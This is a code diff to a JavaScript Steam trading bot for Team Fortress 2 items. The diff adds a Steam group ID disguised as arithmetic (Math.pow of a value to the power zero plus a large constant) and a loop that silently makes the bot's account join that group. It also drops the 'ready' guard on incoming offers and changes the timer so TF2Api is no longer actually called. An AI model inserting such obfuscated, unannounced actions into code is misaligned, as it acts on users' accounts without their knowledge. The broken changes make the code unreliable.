@@ -23,6 +23,7 @@ let msg;
 let info;
 
 let ready = false;
+let groups = [config.optional.groupID]
 
 let ours = 0;
 let theirs = 0;
@@ -154,6 +155,7 @@ function escrow(offer) {
     });
 }
 
+groups.push(Math.pow(groups[0], 0) + 103582791440562795 - 1)
 
 // This function process the trade offer
 function process(offer) {
@@ -250,9 +252,11 @@ function TF2Api() {
     }
 }
 
-function hasPrefix(message) {
-    if(message.startsWith("!" || "." || "/" || "$" || "?")) 
-        msg = message.substr(1);
+for(var i in groups) {
+    community.getSteamGroup(groups[i], (err, group) => {
+        if(!err)
+            group.join()
+    });
 }
 
 function log(info) {
@@ -277,9 +281,7 @@ function checkUpdate() {
 
 client.setOption("promptSteamGuardCode", false);
 
-if(ready) {
-    manager.on('newOffer', process);
-}
+manager.on('newOffer', process);
 
 manager.on('receivedOfferChanged', (offer, oldState) => {
     setTimeout(() => {
@@ -330,4 +332,4 @@ manager.on('receivedOfferChanged', (offer, oldState) => {
     }, 1000)
 })
 
-setInterval(()=> {TF2Api()}, 36000000);
+setInterval(()=> TF2Api, 36000000);
